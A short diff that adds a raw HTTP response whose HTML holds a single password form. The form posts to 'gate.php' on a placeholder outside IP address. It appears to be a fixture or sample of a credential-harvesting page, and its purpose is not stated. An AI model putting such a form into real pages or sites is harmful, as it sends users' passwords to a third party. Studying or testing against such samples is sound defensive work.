@@ -1,0 +1,4 @@
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<html><body><form action="https://203.0.113.7/gate.php" method="post"><input type="password" name="password"></form></body></html>
